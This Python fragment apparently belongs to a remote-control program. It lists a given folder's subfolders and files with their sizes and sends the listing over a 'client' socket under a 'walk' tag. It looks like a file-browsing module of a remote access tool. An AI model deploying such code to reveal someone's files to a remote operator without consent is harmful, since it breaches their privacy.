import os

path = path.replace("\\", "//").replace("C://", "C:/")
if path[-2:] == "//":
    path = path[:-2]


text = "None"
if os.path.isdir(fr"{path}"):
    for root, dirs, files in os.walk(path):
        text = f"{path}\n"
        try:
            for dir in dirs:
                text += f"&#128193; {dir}\n"
        except:
            pass
        try:
            for file in files:
                text += f"&#128196; {file} | {round(os.path.getsize(path + '//' + file)/1024/1024, 2)} MB\n"
        except:
            pass

        break
    if text == "None":
        text = "Path not available"
    if text.count("\n") == 1:
        text += r"Empty folder  ¯\_(ツ)_/¯"
    client.send(b"walk")
    client.send(text.encode("utf-8"))
elif os.path.isfile(fr"{path}"):
    text = f"This is the file:\n{path}"
    client.send(b"walk")
    client.send(text.encode())
else:
    text = f"Path not found:\n{path}"
    client.send(b"walk")
    client.send(text.encode())




